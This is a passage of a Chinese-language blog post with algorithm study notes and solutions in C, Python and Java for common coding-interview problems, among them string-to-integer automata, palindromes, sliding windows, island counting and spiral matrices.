class="line"></span><br><span class="line">        curNode-&gt;next = (struct ListNode*) <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        curNode-&gt;next-&gt;val = sum;</span><br><span class="line">        curNode-&gt;next-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        curNode = curNode-&gt;next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(l1 != <span class="literal">NULL</span>)</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(l2 != <span class="literal">NULL</span>)</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(carry == <span class="number">1</span>)&#123;</span><br><span class="line">        curNode-&gt;next = (struct ListNode*)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        curNode-&gt;next-&gt;val = carry;</span><br><span class="line">        curNode-&gt;next-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headNode-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="字符串转整数"   >
          <a href="#字符串转整数" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符串转整数" class="headerlink" title="字符串转整数"></a>字符串转整数</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220912124644320.png" alt="image-20220912124644320"></p>
<p>自动机</p>
<p>依据每个状态进行转换，即确定所有状态，已经该状态的下个状态都有什么，这里就是如下所示的表格</p>
<div class="table-container"><table>
<thead>
<tr>
<th></th>
<th>空格</th>
<th>符号+/-</th>
<th>数字</th>
<th>其他符号</th>
</tr>
</thead>
<tbody><tr>
<td>start</td>
<td>start</td>
<td>signed</td>
<td>in_number</td>
<td>end</td>
</tr>
<tr>
<td>signed</td>
<td>end</td>
<td>end</td>
<td>in_number</td>
<td>end</td>
</tr>
<tr>
<td>in_number</td>
<td>end</td>
<td>end</td>
<td>in_number</td>
<td>end</td>
</tr>
<tr>
<td>end</td>
<td>end</td>
<td>end</td>
<td>end</td>
<td>end</td>
</tr>
</tbody></table></div>
<p>同时编程时设定</p>
<ul>
<li><p>状态<code>state</code>：<code>start</code>，<code>signed</code>，<code>in_number</code>，<code>end</code></p>
</li>
<li><p>值<code>ans</code>：获取到的数字的值</p>
</li>
<li><p>符号<code>sign</code>：<code>1</code>为正数、<code>-1</code>为负数</p>
</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">INT_MAX = <span class="number">2</span> ** <span class="number">31</span> - <span class="number">1</span></span><br><span class="line">INT_MIN = -<span class="number">2</span> ** <span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Automaton</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.state = <span class="string">&#x27;start&#x27;</span></span><br><span class="line">        self.sign = <span class="number">1</span></span><br><span class="line">        self.ans = <span class="number">0</span></span><br><span class="line">        self.table = &#123;</span><br><span class="line">            <span class="string">&#x27;start&#x27;</span>: [<span class="string">&#x27;start&#x27;</span>, <span class="string">&#x27;signed&#x27;</span>, <span class="string">&#x27;in_number&#x27;</span>, <span class="string">&#x27;end&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;signed&#x27;</span>: [<span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;in_number&#x27;</span>, <span class="string">&#x27;end&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;in_number&#x27;</span>: [<span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;in_number&#x27;</span>, <span class="string">&#x27;end&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;end&#x27;</span>: [<span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;end&#x27;</span>],</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_col</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="keyword">if</span> c.isspace():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;+&#x27;</span> <span class="keyword">or</span> c == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> c.isdigit():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        self.state = self.table[self.state][self.get_col(c)]</span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">&#x27;in_number&#x27;</span>:</span><br><span class="line">            self.ans = self.ans * <span class="number">10</span> + <span class="built_in">int</span>(c)</span><br><span class="line">            self.ans = <span class="built_in">min</span>(self.ans, INT_MAX) <span class="keyword">if</span> self.sign == <span class="number">1</span> <span class="keyword">else</span> <span class="built_in">min</span>(self.ans, -INT_MIN)</span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">&#x27;signed&#x27;</span>:</span><br><span class="line">            self.sign = <span class="number">1</span> <span class="keyword">if</span> c == <span class="string">&#x27;+&#x27;</span> <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span>(<span class="params">self, <span class="built_in">str</span>: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        automaton = Automaton()</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            automaton.get(c)</span><br><span class="line">        <span class="keyword">return</span> automaton.sign * automaton.ans</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>








        <h2 id="最长回文子串"   >
          <a href="#最长回文子串" class="heading-link"><i class="fas fa-link"></i></a><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a>最长回文子串</h2>
      
        <h3 id="中心扩散法"   >
          <a href="#中心扩散法" class="heading-link"><i class="fas fa-link"></i></a><a href="#中心扩散法" class="headerlink" title="中心扩散法"></a>中心扩散法</h3>
      
        <h3 id="动态规划"   >
          <a href="#动态规划" class="heading-link"><i class="fas fa-link"></i></a><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3>
      <p>首先明确一个字符串，如果首尾两个字符相同，并且去掉这两个字符后的字符串还是回文字符串，那么这个字符串即为回文字符串。</p>
<p><code>abcba</code> -&gt; 去掉首尾<code>aa</code> -&gt; <code>bcb</code>还是回文字符串，那么该字符串<code>abcba</code>即为回文字符串，这样就可以由大化小。</p>

        <h4 id="状态设定"   >
          <a href="#状态设定" class="heading-link"><i class="fas fa-link"></i></a><a href="#状态设定" class="headerlink" title="状态设定"></a>状态设定</h4>
      <p>首先定义一个二维数组状态<code>dp[i][j]</code>即为<code>str[i:j]</code>，若其值<code>dp[i][j]</code>为<code>True</code>，则代表子字符串<code>str[i:j]</code>为回文字符串。然后确定最开始的状态表，即最小的元素<code>dp[i][i]</code></p>
<div class="table-container"><table>
<thead>
<tr>
<th>i\j</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>..</th>
<th>n</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>True</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td></td>
<td>True</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td></td>
<td></td>
<td>True</td>
<td></td>
<td></td>
</tr>
<tr>
<td>..</td>
<td></td>
<td></td>
<td></td>
<td>True</td>
<td></td>
</tr>
<tr>
<td>n</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>True</td>
</tr>
</tbody></table></div>
<p>一个字符的子字符串一定为<code>True</code>，然后依据这个来判断外面的字符串是否为回文字符串。</p>

        <h4 id="状态转换方程"   >
          <a href="#状态转换方程" class="heading-link"><i class="fas fa-link"></i></a><a href="#状态转换方程" class="headerlink" title="状态转换方程"></a>状态转换方程</h4>
      <p>由上可得，对应子字符串<code>str[i:j]</code>为回文字符串的必要条件为字符串<code>str[i+1:j-1]</code>为回文字符串，那么即可从小状态<code>dp[i+1][j-1]</code>赋值给大状态<code>dp[i][j]</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="built_in">str</span>[j]):</span><br><span class="line">	dp[i][j] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>]</span><br></pre></td></tr></table></div></figure>

<p>那么定义完成边界之后，就可以进行相关代码编写了</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">myStr = <span class="string">&quot;cbdsgfsdaadsas&quot;</span></span><br><span class="line">myLen = <span class="built_in">len</span>(myStr)</span><br><span class="line">dp = [[<span class="literal">False</span>] * myLen <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(myLen)]</span><br><span class="line">max_len = <span class="number">1</span></span><br><span class="line">begin = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(myLen):</span><br><span class="line">    dp[i][i] = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> L <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,myLen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(myLen):</span><br><span class="line">        j = i + L - <span class="number">1</span></span><br><span class="line">        <span class="comment">#设定最大右边界</span></span><br><span class="line">        <span class="keyword">if</span>( j &gt;= myLen):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(myStr[i] != myStr[j]):</span><br><span class="line">            dp[i][j] = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> j-i &lt; <span class="number">3</span> :</span><br><span class="line">                dp[i][j] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i][j] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span>(dp[i][j] <span class="keyword">and</span> L &gt; max_len):</span><br><span class="line">            max_len = L</span><br><span class="line">            begin = i</span><br><span class="line"><span class="built_in">print</span>(myStr[begin:begin+max_len])</span><br></pre></td></tr></table></div></figure>


        <h2 id="无重复字符的最长子串"   >
          <a href="#无重复字符的最长子串" class="heading-link"><i class="fas fa-link"></i></a><a href="#无重复字符的最长子串" class="headerlink" title="无重复字符的最长子串"></a>无重复字符的最长子串</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141117639.png" alt="image-20220914111707372"></p>

        <h3 id="滑动窗口"   >
          <a href="#滑动窗口" class="heading-link"><i class="fas fa-link"></i></a><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h3>
      <p>比如一个字符串<code>str</code>为<code>pwwkew</code>，首先从<code>str[0]</code>开始创建一个队列<code>queue</code>，其中元素为<code>str[0]</code></p>
<ul>
<li>将<code>str[1]</code>加入队列，满足无重复要求</li>
<li>之后将<code>str[2]</code>加入队列，发现不满足要求，记录此时的字符串长度为<code>L</code>，记下起始位置<code>i</code>并且和<code>max_len</code>对比取大值。</li>
<li>这时将队首元素<code>str[0]</code>移出队列，发现还是不满足要求，再将新的队首元素<code>str[1]</code>移出队列，发现满足要求了，接着循环</li>
<li>将<code>str[3]</code>加入队列，满足要求，依次循环</li>
</ul>
<p>每一步大概如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209140930864.png" alt="123"></p>
<p>在加入队列不满足要求的时候记录此时的其实位置<code>i</code>和字符串长度<code>L</code>来取值比较即可</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Set&lt;Character&gt; queue = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">int</span> rightPoint = <span class="number">0</span>, max_len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> L = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++)&#123;</span><br><span class="line">            <span class="keyword">while</span> (  (rightPoint &lt; n) &amp;&amp; !queue.contains(s.charAt(rightPoint)))&#123;</span><br><span class="line">                queue.add(s.charAt(rightPoint));</span><br><span class="line">                rightPoint++;</span><br><span class="line">            &#125;</span><br><span class="line">            L = rightPoint-i;</span><br><span class="line">            <span class="keyword">if</span>(L &gt; max_len)&#123;</span><br><span class="line">                max_len = L;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(rightPoint &lt; n -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    queue.remove(s.charAt(<span class="number">0</span>));</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    queue.remove(s.charAt(i));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> max_len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_len;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="岛屿数量"   >
          <a href="#岛屿数量" class="heading-link"><i class="fas fa-link"></i></a><a href="#岛屿数量" class="headerlink" title="岛屿数量"></a>岛屿数量</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141118246.png" alt="image-20220914111803102"></p>

        <h3 id="深度优先搜索DFS"   >
          <a href="#深度优先搜索DFS" class="heading-link"><i class="fas fa-link"></i></a><a href="#深度优先搜索DFS" class="headerlink" title="深度优先搜索DFS"></a>深度优先搜索DFS</h3>
      <p>类似如下所示，遍历顺序为黄-&gt;紫-&gt;红-&gt;绿-&gt;蓝</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141201011.png" alt="DFS"></p>
<p>即依据一个结点，从该结点的上下左右往外扩散遍历所有结点，遇到一个结点就进去遍历，核心思想是发现结点，先进再说。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numIslands</span>(<span class="params">self, grid: [[<span class="built_in">str</span>]]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">grid,i,j</span>):</span></span><br><span class="line">            <span class="comment">#表示该结点已经遍历过了</span></span><br><span class="line">            grid[i][j] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>((i-<span class="number">1</span> &gt;= <span class="number">0</span>) <span class="keyword">and</span> grid[i-<span class="number">1</span>][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                dfs(grid,i-<span class="number">1</span>,j)</span><br><span class="line">            <span class="keyword">if</span>((i+<span class="number">1</span> &lt; <span class="built_in">len</span>(grid)) <span class="keyword">and</span> grid[i+<span class="number">1</span>][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                dfs(grid,i+<span class="number">1</span>,j)</span><br><span class="line">            <span class="keyword">if</span>((j-<span class="number">1</span> &gt;= <span class="number">0</span>) <span class="keyword">and</span> grid[i][j-<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                dfs(grid,i,j-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span>((j+<span class="number">1</span> &lt; <span class="built_in">len</span>(grid[<span class="number">0</span>])) <span class="keyword">and</span> grid[i][j+<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                dfs(grid,i,j+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(grid)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(grid[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                    dfs(grid,i,j)</span><br><span class="line">                    count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></div></figure>


        <h3 id="广度优先搜索BFS"   >
          <a href="#广度优先搜索BFS" class="heading-link"><i class="fas fa-link"></i></a><a href="#广度优先搜索BFS" class="headerlink" title="广度优先搜索BFS"></a>广度优先搜索BFS</h3>
      <p>类似如下所示，遍历顺序同样为黄-&gt;紫-&gt;红-&gt;绿-&gt;蓝，相当于是一层一层的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141357212.png" alt="BFS"></p>
<p>但是这样就需要用到一个队列，从一个结点出发的下一层都放到该队列尾部，然后从队首取结点，再遍历，将该结点的下一层也放入队列尾部，依次循环。</p>
<p>有点像将一个结点的出口点全面存储起来放到一个队列的最后一起进行遍历</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numIslands</span>(<span class="params">self, grid: [[<span class="built_in">str</span>]]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">bfs</span>(<span class="params">grid,i,j</span>):</span></span><br><span class="line">            queue = [[i,j]]</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                [i,j] = queue.pop(<span class="number">0</span>)</span><br><span class="line">                <span class="comment">#可能存在放入队列的重复结点，所以需要再判断</span></span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                    grid[i][j] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span>((i-<span class="number">1</span> &gt;= <span class="number">0</span>) <span class="keyword">and</span> grid[i-<span class="number">1</span>][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                        queue.append([i-<span class="number">1</span>,j])</span><br><span class="line">                    <span class="keyword">if</span>((i+<span class="number">1</span> &lt; <span class="built_in">len</span>(grid)) <span class="keyword">and</span> grid[i+<span class="number">1</span>][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                        queue.append([i+<span class="number">1</span>,j])</span><br><span class="line">                    <span class="keyword">if</span>((j-<span class="number">1</span> &gt;= <span class="number">0</span>) <span class="keyword">and</span> grid[i][j-<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                        queue.append([i,j-<span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">if</span>((j+<span class="number">1</span> &lt; <span class="built_in">len</span>(grid[<span class="number">0</span>])) <span class="keyword">and</span> grid[i][j+<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                        queue.append([i,j+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(grid)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(grid[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                    bfs(grid,i,j)</span><br><span class="line">                    count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></div></figure>


        <h2 id="盛最多水的容器"   >
          <a href="#盛最多水的容器" class="heading-link"><i class="fas fa-link"></i></a><a href="#盛最多水的容器" class="headerlink" title="盛最多水的容器"></a>盛最多水的容器</h2>
      <p>贪心算法、双指针</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141657084.png" alt="image-20220914165747824"></p>
<p>确定两个指针从头尾开始，依次往中间收缩，由于是装水容量由短板决定，所以对于例子<code>container[0:8]</code>组成的容器来说，左指针对应高度小于右指针对应高度，所以右指针如果往左移动，其容量只会减少。那么我们就尝试将左指针往右移动，企图寻找更大的容器。</p>
<p>其证明感觉没见到几个讲的很清楚的。</p>
<p>这里需要明白一点，最大的容器左右边界之外如果还有边界，那么外面的边界的最大值一定比这个最大容器的短板更短，如果更长，那么挪过去之后，肯定容器更大了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxArea</span>(<span class="params">self, height: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        j = <span class="built_in">len</span>(height)-<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; j:</span><br><span class="line">            <span class="keyword">if</span>(height[i] &lt; height[j]):</span><br><span class="line">                res = <span class="built_in">max</span>(res,height[i]*(j-i))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res = <span class="built_in">max</span>(res,height[j] * (j-i))</span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>



<p>([)]</p>

        <h2 id="螺旋矩阵"   >
          <a href="#螺旋矩阵" class="heading-link"><i class="fas fa-link"></i></a><a href="#螺旋矩阵" class="headerlink" title="螺旋矩阵"></a>螺旋矩阵</h2>
      
        <h3 id="自动机"   >
          <a href="#自动机" class="heading-link"><i class="fas fa-link"></i></a><a href="#自动机" class="headerlink" title="自动机"></a>自动机</h3>
      <div class="table-container"><table>
<thead>
<tr>
<th></th>
<th>number</th>
<th>符号##/边界</th>
</tr>
</thead>
<tbody><tr>
<td>right</td>
<td>right</td>
<td>down</td>
</tr>
<tr>
<td>down</td>
<td>down</td>
<td>left</td>
</tr>
<tr>
<td>left</td>
<td>left</td>
<td>up</td>
</tr>
<tr>
<td>up</td>
<td>up</td>
<td>right</td>
</tr>
</tbody></table></div>
<p>由此写出自动机相关代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Automaton</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,matrix</span>):</span></span><br><span class="line">        self.matrix = matrix</span><br><span class="line">        self.state = <span class="string">&#x27;right&#x27;</span></span><br><span class="line">        self.i = <span class="number">0</span></span><br><span class="line">        self.j = -<span class="number">1</span></span><br><span class="line">        self.myList = []</span><br><span class="line">        self.table = &#123;</span><br><span class="line">            <span class="string">&#x27;right&#x27;</span>: [<span class="string">&#x27;right&#x27;</span>, <span class="string">&#x27;down&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;down&#x27;</span>: [<span class="string">&#x27;down&#x27;</span>, <span class="string">&#x27;left&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;left&#x27;</span>: [<span class="string">&#x27;left&#x27;</span>, <span class="string">&#x27;up&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;up&#x27;</span>: [<span class="string">&#x27;up&#x27;</span>, <span class="string">&#x27;right&#x27;</span>],</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_col</span>(<span class="params">self,i,j</span>):</span></span><br><span class="line">        <span class="keyword">if</span>  j &gt;= <span 